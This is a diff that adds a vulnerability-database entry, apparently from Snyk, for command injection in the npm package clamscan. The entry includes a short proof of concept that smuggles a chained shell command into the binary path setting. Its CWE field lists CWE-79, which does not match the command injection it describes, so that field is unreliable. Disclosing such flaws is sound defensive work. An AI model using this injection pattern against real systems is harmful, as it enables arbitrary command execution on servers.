@@ -45,3 +45,47 @@
   references:
   - https://github.com/kylefarris/clamscan/commit/e2a7cbcd222aa8bbd61477fc3beabbe9ad3d8a71
   source_url: https://snyk.io/vuln/npm:clamscan:20150821
+- id: snykio:npm:clamscan:564113
+  title: Command Injection
+  description: |
+    [clamscan][1] is a Use Node JS to scan files on your server with
+    ClamAV\'s clamscan binary or clamdscan daemon. This is especially useful
+    for scanning uploaded files provided by un-trusted sources.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    It is possible to inject arbitrary commands as part of the
+    `_is_clamav_binary` function located within `Index.js`.
+
+    It should be noted that this vulnerability requires a pre-requisite that
+    a folder should be created with the same command that will be chained to
+    execute. This lowers the risk of this issue.
+
+    ### PoC by Snyk   {#poc-by-snyk}
+
+        var Root = require("clamscan");
+        var fs = require("fs");
+        var attack_code = "echo vulnerable > create.txt";
+        var root = new Root();
+        fs.mkdir(attack_code + "&", function(){});
+        root.init({"clamscan": {'path': attack_code + "&"}});
+
+
+
+    [1]: https://github.com/kylefarris/clamscan
+  affected_package: clamscan
+  vulnerable_versions:
+  - "*"
+  severity: low
+  package_manager: npm
+  cve:
+  - CVE-2020-7613
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-04-01
+  created_date: 2020-04-01
+  last_modified_date: 2020-04-01
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/kylefarris/clamscan/blob/master/index.js#L34
+  source_url: https://snyk.io/vuln/SNYK-JS-CLAMSCAN-564113
